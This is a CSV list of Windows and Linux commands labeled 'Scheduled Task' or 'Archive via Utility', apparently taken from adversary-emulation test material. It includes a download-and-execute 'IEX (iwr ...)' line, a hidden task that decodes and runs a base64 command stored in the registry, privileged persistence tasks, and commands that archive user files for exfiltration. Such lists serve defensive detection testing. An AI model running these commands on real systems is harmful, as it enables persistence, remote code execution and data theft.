Command,Technique
"schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""",Scheduled Task
"schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",Scheduled Task
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST #{time},Scheduled Task
SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST 20:10,Scheduled Task
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST #{time}",Scheduled Task
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST 20:10",Scheduled Task
"SCHTASKS /Create /S localhost /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}",Scheduled Task
"SCHTASKS /Create /S #{target} /RU DOMAIN\user /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}",Scheduled Task
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}",Scheduled Task
"$Action = New-ScheduledTaskAction -Execute ""calc.exe""",Scheduled Task
$Trigger = New-ScheduledTaskTrigger -AtLogon,Scheduled Task
"$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest",Scheduled Task
$Set = New-ScheduledTaskSettingsSet,Scheduled Task
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set,Scheduled Task
Register-ScheduledTask AtomicTask -InputObject $object,Scheduled Task
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,Scheduled Task
"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)",Scheduled Task
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""",Scheduled Task
"$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml"")",Scheduled Task
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",Scheduled Task
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f,Scheduled Task
"schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45",Scheduled Task
"$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"")",Scheduled Task
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",Scheduled Task
"$Action = New-ScheduledTaskAction -Execute ""cmd.exe""",Scheduled Task
$Trigger = New-ScheduledTaskTrigger -AtLogon,Scheduled Task
"$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest",Scheduled Task
$Set = New-ScheduledTaskSettingsSet,Scheduled Task
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set,Scheduled Task
Register-ScheduledTask AtomicTaskModifed -InputObject $object,Scheduled Task
"$NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""",Scheduled Task
"Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction",Scheduled Task
"""#{rar_exe}"" a -r #{output_file} %USERPROFILE%\*#{file_extension}",Archive via Utility
"""#{rar_exe}"" a -r #{output_file} #{input_path}\*.txt",Archive via Utility
"""#{rar_exe}"" a -r %USERPROFILE%\T1560.001-data.rar #{input_path}\*#{file_extension}",Archive via Utility
"""#{rar_exe}"" a -r #{output_file} #{input_path}\*#{file_extension}",Archive via Utility
"""%programfiles%/WinRAR/Rar.exe"" a -r #{output_file} #{input_path}\*#{file_extension}",Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""#{rar_exe}"" a -hp""blue"" hello.rar",Archive via Utility
dir,Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar",Archive via Utility
dir,Archive via Utility
"path=%path%;""C:\Program Files (x86)\winzip""",Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""%ProgramFiles%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip *",Archive via Utility
dir,Archive via Utility
"path=%path%;""C:\Program Files (x86)\winzip""",Archive via Utility
mkdir .\tmp\victim-files,Archive via Utility
cd .\tmp\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""#{winzip_exe}"" -min -a -s""hello"" archive.zip *",Archive via Utility
dir,Archive via Utility
mkdir $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
cd $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""#{7zip_exe}"" u archive.7z *txt -pblue",Archive via Utility
dir,Archive via Utility
mkdir $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
cd $PathToAtomicsFolder\T1560.001\victim-files,Archive via Utility
"echo ""This file will be encrypted"" > .\encrypted_file.txt",Archive via Utility
"""%ProgramFiles%\7-zip\7z.exe"" u archive.7z *txt -pblue",Archive via Utility
dir,Archive via Utility
"zip #{output_file} /var/log/{w,b}tmp",Archive via Utility
zip $HOME/data.zip #{input_files},Archive via Utility
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt),Archive via Utility
test -e #{input_file} && gzip -k #{input_file} || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> #{input_file}; gzip -k #{input_file}),Archive via Utility
tar -cvzf #{output_file} $HOME/$USERNAME,Archive via Utility
